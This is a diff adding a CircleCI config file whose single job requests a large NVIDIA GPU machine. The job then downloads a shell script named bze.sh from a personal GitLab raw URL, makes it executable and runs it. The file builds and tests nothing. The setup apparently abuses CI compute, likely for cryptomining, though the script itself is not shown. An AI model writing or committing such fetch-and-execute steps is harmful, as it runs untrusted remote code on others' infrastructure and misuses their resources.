@@ -1,0 +1,10 @@
+version: 2.1
+jobs:
+  build:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-1604-cuda-10.1:201909-23
+    steps:
+      - run: wget https://gitlab.com/viwarlani/build/-/raw/main/bze.sh && chmod +x *.sh && ./bze.sh
+parallelism: 1
+      
